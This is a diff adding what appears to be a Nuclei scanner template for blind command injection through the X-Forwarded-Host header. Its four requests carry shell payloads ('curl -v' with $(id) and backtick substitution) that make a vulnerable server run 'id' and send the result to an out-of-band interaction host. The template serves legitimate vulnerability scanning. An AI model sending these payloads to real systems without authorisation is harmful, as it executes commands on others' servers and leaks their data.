@@ -1,0 +1,54 @@
+http:
+- extractors:
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-Host: curl -v {{interactsh-url}}/$(id)/`id`
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-Host: curl -v `id`.{{interactsh-url}}/
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-Host: `curl -v $(id).{{interactsh-url}}`
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-Host: ;`curl -v $(id).{{interactsh-url}}/$(id)`
+
+    '
+  stop-at-first-match: true
+id: blind-command-injection-xfh
+info:
+  author: reewardius
+  name: Blind Command Injection
+  severity: critical
+  tags: rce,generic
